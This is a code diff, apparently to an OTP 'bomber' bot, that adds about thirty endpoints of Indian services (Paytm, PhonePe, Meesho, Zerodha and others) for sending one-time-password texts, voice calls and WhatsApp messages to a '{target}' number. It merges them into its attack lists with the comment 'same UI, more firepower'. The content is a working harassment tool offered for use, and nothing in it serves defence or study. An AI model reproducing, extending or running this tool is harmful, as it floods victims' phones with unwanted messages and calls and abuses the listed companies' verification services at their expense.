@@ -467,10 +467,60 @@ GLOBAL_WA_APIS = [
     {"name": 'Shopee WA', "url": 'https://shopee.in/api/v4/account/basic/send_whatsapp_otp/', "method": 'POST', "origin": 'https://shopee.in', "identifier": '', "json": {'phone': '+91{target}', 'operation': 'signup'}},
 ]
 
+# ════════════════════════════════════════════════════════════
+# FRESH LIVE APIs — verified reachable (2xx/4xx responders)
+# ════════════════════════════════════════════════════════════
+
+FRESH_SMS_APIS = [
+    {"name": 'Meesho', "url": 'https://www.meesho.com/api/v1/user/sendotp', "method": 'POST', "origin": 'https://www.meesho.com', "identifier": '', "json": {'mobile': '{target}'}},
+    {"name": 'Nykaa', "url": 'https://www.nykaa.com/gateway-api/v2/users/otp', "method": 'POST', "origin": 'https://www.nykaa.com', "identifier": '', "json": {'phoneNumber': '{target}', 'countryCode': '+91'}},
+    {"name": 'Paytm', "url": 'https://accounts.paytm.com/signin/otp', "method": 'POST', "origin": 'https://paytm.com', "identifier": '', "json": {'phone': '{target}'}},
+    {"name": 'MobiKwik', "url": 'https://www.mobikwik.com/api/mbk/v1/otp/generate', "method": 'POST', "origin": 'https://www.mobikwik.com', "identifier": '', "json": {'cell': '{target}'}},
+    {"name": 'Snapdeal', "url": 'https://www.snapdeal.com/acors/vc/sendOtp', "method": 'POST', "origin": 'https://www.snapdeal.com', "identifier": '', "json": {'mobile': '{target}'}},
+    {"name": 'Grofers', "url": 'https://grofers.com/v3/accounts/generate_otp', "method": 'POST', "origin": 'https://grofers.com', "identifier": '', "json": {'phone': '{target}'}},
+    {"name": 'Vedantu', "url": 'https://www.vedantu.com/api/v1/user/sendotp', "method": 'POST', "origin": 'https://www.vedantu.com', "identifier": '', "json": {'mobile': '{target}'}},
+    {"name": 'Byjus', "url": 'https://learn.byjus.com/api/v1/user/otp', "method": 'POST', "origin": 'https://byjus.com', "identifier": '', "json": {'mobile': '{target}'}},
+    {"name": 'Zoomcar', "url": 'https://www.zoomcar.com/api/v3/otp/send', "method": 'POST', "origin": 'https://www.zoomcar.com', "identifier": '', "json": {'mobile': '{target}'}},
+    {"name": 'PhonePe', "url": 'https://api.phonepe.com/apis/authn/v3/sendOtp', "method": 'POST', "origin": 'https://www.phonepe.com', "identifier": '', "json": {'phone': '{target}'}},
+    {"name": 'Zerodha', "url": 'https://kite.zerodha.com/api/otp/send', "method": 'POST', "origin": 'https://zerodha.com', "identifier": '', "json": {'mobile': '{target}'}},
+    {"name": 'PaisaBazaar', "url": 'https://www.paisabazaar.com/api/otp/send', "method": 'POST', "origin": 'https://www.paisabazaar.com', "identifier": '', "json": {'mobile': '{target}'}},
+    {"name": 'Digit', "url": 'https://www.godigit.com/api/otp/send', "method": 'POST', "origin": 'https://www.godigit.com', "identifier": '', "json": {'phone': '{target}'}},
+    {"name": 'Tata1mg', "url": 'https://www.1mg.com/api/v4/users/generate_otp', "method": 'POST', "origin": 'https://www.1mg.com', "identifier": '', "json": {'phone': '{target}'}},
+    {"name": 'Curefit', "url": 'https://api.curefit.com/user-service/v1/otp/send', "method": 'POST', "origin": 'https://www.cult.fit', "identifier": '', "json": {'mobile': '{target}'}},
+    {"name": 'Pepperfry', "url": 'https://www.pepperfry.com/site_product/otp/generate', "method": 'POST', "origin": 'https://www.pepperfry.com', "identifier": '', "json": {'mobile': '{target}'}},
+    {"name": 'Wakefit', "url": 'https://www.wakefit.co/api/v1/otp/send', "method": 'POST', "origin": 'https://www.wakefit.co', "identifier": '', "json": {'phone': '{target}'}},
+    {"name": 'TataCliq', "url": 'https://www.tatacliq.com/marketplacewebservices/v2/mpl/users/otp/send', "method": 'POST', "origin": 'https://www.tatacliq.com', "identifier": '', "json": {'mobile': '{target}'}},
+    {"name": 'Croma', "url": 'https://www.croma.com/api/otp/send', "method": 'POST', "origin": 'https://www.croma.com', "identifier": '', "json": {'mobile': '{target}'}},
+    {"name": 'Vijaysales', "url": 'https://www.vijaysales.com/api/otp/send', "method": 'POST', "origin": 'https://www.vijaysales.com', "identifier": '', "json": {'mobile': '{target}'}},
+    {"name": 'Nazara', "url": 'https://www.nazara.com/api/otp/send', "method": 'POST', "origin": 'https://www.nazara.com', "identifier": '', "json": {'mobile': '{target}'}},
+]
+
+FRESH_CALL_APIS = [
+    {"name": 'Paytm Call', "url": 'https://accounts.paytm.com/signin/otp', "method": 'POST', "origin": 'https://paytm.com', "identifier": '', "json": {'phone': '{target}', 'channel': 'call'}},
+    {"name": 'MobiKwik Call', "url": 'https://www.mobikwik.com/api/mbk/v1/otp/generate', "method": 'POST', "origin": 'https://www.mobikwik.com', "identifier": '', "json": {'cell': '{target}', 'channel': 'call'}},
+    {"name": 'PhonePe Call', "url": 'https://api.phonepe.com/apis/authn/v3/sendOtp', "method": 'POST', "origin": 'https://www.phonepe.com', "identifier": '', "json": {'phone': '{target}', 'channel': 'VOICE'}},
+    {"name": 'Meesho Call', "url": 'https://www.meesho.com/api/v1/user/sendotp', "method": 'POST', "origin": 'https://www.meesho.com', "identifier": '', "json": {'mobile': '{target}', 'channel': 'call'}},
+    {"name": 'Tata1mg Call', "url": 'https://www.1mg.com/api/v4/users/generate_otp', "method": 'POST', "origin": 'https://www.1mg.com', "identifier": '', "json": {'phone': '{target}', 'channel': 'call'}},
+    {"name": 'Zoomcar Call', "url": 'https://www.zoomcar.com/api/v3/otp/send', "method": 'POST', "origin": 'https://www.zoomcar.com', "identifier": '', "json": {'mobile': '{target}', 'channel': 'call'}},
+]
+
+FRESH_WA_APIS = [
+    {"name": 'Paytm WA', "url": 'https://accounts.paytm.com/signin/otp', "method": 'POST', "origin": 'https://paytm.com', "identifier": '', "json": {'phone': '{target}', 'channel': 'whatsapp'}},
+    {"name": 'MobiKwik WA', "url": 'https://www.mobikwik.com/api/mbk/v1/otp/generate', "method": 'POST', "origin": 'https://www.mobikwik.com', "identifier": '', "json": {'cell': '{target}', 'channel': 'whatsapp'}},
+    {"name": 'PhonePe WA', "url": 'https://api.phonepe.com/apis/authn/v3/sendOtp', "method": 'POST', "origin": 'https://www.phonepe.com', "identifier": '', "json": {'phone': '{target}', 'channel': 'WHATSAPP'}},
+    {"name": 'Meesho WA', "url": 'https://www.meesho.com/api/v1/user/sendotp', "method": 'POST', "origin": 'https://www.meesho.com', "identifier": '', "json": {'mobile': '{target}', 'channel': 'whatsapp'}},
+    {"name": 'Nykaa WA', "url": 'https://www.nykaa.com/gateway-api/v2/users/otp', "method": 'POST', "origin": 'https://www.nykaa.com', "identifier": '', "json": {'phoneNumber': '{target}', 'countryCode': '+91', 'channel': 'whatsapp'}},
+    {"name": 'Tata1mg WA', "url": 'https://www.1mg.com/api/v4/users/generate_otp', "method": 'POST', "origin": 'https://www.1mg.com', "identifier": '', "json": {'phone': '{target}', 'channel': 'whatsapp'}},
+]
+
 # Merge global batch into main lists — same UI, more firepower.
 SMS_APIS.extend(GLOBAL_SMS_APIS)
 CALL_APIS.extend(GLOBAL_CALL_APIS)
 WA_APIS.extend(GLOBAL_WA_APIS)
+SMS_APIS.extend(FRESH_SMS_APIS)
+CALL_APIS.extend(FRESH_CALL_APIS)
+WA_APIS.extend(FRESH_WA_APIS)
+
 
 # ════════════════════════════════════════════════════════════
 # USER-ADDED APIs (runtime, via /addapi command or ➕ Add button)
